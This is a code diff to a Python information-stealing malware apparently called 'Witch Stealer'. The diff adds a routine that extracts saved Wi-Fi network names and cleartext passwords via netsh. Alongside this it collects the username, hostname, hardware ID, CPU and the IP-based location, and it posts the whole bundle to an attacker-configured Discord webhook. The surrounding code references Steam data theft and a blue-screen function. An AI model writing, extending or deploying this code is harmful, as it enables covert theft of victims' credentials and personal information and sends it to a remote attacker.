@@ -24,7 +24,7 @@ from ctypes import wintypes, byref, c_bool
 from Crypto.Cipher import AES
 
 __CONFIG__ = {
-    "avatar_link": "https://cdn.pfps.gg/pfps/56483-dark-girl.jpeg",
+    "avatar_link": "https://i.imgur.com/YMLOX3J.png",
     "webhook": "",
     "discord": False,
     "system": False,
@@ -445,7 +445,7 @@ def steam():
 def systeminformation():
     hostname = socket.gethostname()
     username = os.getlogin()
-    display_username = "⚙️ [We Back Soon!]"
+    # display_username = "⚙️ [We Back Soon!]"
 
     c = wmi.WMI()
     GPUm = "Unknown"
@@ -454,33 +454,68 @@ def systeminformation():
 
     def hwid():
         command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
-        hwid = subprocess.check_output(command, shell=True, text=True).strip()
-        return hwid
-    
-    hardware_id = hwid()
+        return subprocess.check_output(command, shell=True, text=True).strip()
 
+    def get_wifi_data() -> list[str]:
+        networks = []
+        try:
+            output = subprocess.check_output(
+                ['netsh', 'wlan', 'show', 'profiles'],
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore').split('\n')
+
+            profiles = [line.split(":")[1].strip() for line in output if "All User Profile" in line]
+
+            for name in profiles:
+                try:
+                    result = subprocess.check_output(
+                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
+                        stderr=subprocess.DEVNULL,
+                        stdin=subprocess.DEVNULL
+                    ).decode('utf-8', errors='ignore').split('\n')
+
+                    password_lines = [line for line in result if "Key Content" in line]
+                    password = password_lines[0].split(":")[1].strip() if password_lines else ""
+                    networks.append(f'network = "{name} | {password or "[NONE]"}"')
+                except subprocess.CalledProcessError:
+                    networks.append(f'network = "{name} | [??]"')
+        except subprocess.CalledProcessError:
+            pass
+
+        return networks
+
+    hardware_id = hwid()
     cpu = platform.processor()
     os_name = platform.platform()
     pc_name = platform.node()
 
-    ipinfo = requests.get("https://ipinfo.io/json")
-    data = ipinfo.json()
+    try:
+        ipinfo = requests.get("https://ipinfo.io/json")
+        data = ipinfo.json()
+    except Exception:
+        data = {}
+
+    wifi_list = get_wifi_data()
+    wifi_str = "\n".join(wifi_list) if wifi_list else "[Wi-FI NONE]"
 
     fields = [
-            {"name": "👤 USER", "value": f"```\nDISPLAY NAME: {display_username}\nUSERNAME: {username}\nHOSTNAME: {hostname}```", "inline": False},
+            {"name": "👤 USER", "value": f"```\nUSERNAME: {username}\nHOSTNAME: {hostname}```", "inline": False},
             {"name": "📱 SYSTEM", "value": f"```\nCPU: {cpu}\nGPU: {GPUm}\nHwid: {hardware_id}```"},
-            {"name": "📡 NETWORK", "value": f"```\nIP Address: {data.get('ip')}\nCITY: {data.get('city')}\nREGION: {data.get('region')}\nCOUNTRY: {data.get('country')}\nTIMEZONE: {data.get('timezone')}```"}
+            {"name": "📡 NETWORK", "value": f"```\nIP Address: {data.get('ip')}\nCITY: {data.get('city')}\nREGION: {data.get('region')}\nCOUNTRY: {data.get('country')}\nTIMEZONE: {data.get('timezone')}```"},
+            {"name": "📡 WIFI", "value": f"```\n{wifi_str}```"}
         ]
-    
+
     embed = {
-            "username": "Witch Stealer",
-            "avatar_url": __CONFIG__["avatar_link"],
-            "embeds": [{
-                "title": f"SYSTEM INFORMATION",
-                "color": 0x000000,
-                "fields": fields,
-            }]
-        }
+        "username": "Witch Stealer",
+        "avatar_url": __CONFIG__["avatar_link"],
+        "embeds": [{
+            "title": "SYSTEM INFORMATION",
+            "color": 0x000000,
+            "fields": fields,
+        }]
+    }
+
     requests.post(__CONFIG__["webhook"], json=embed)
 
 def blue_screen():
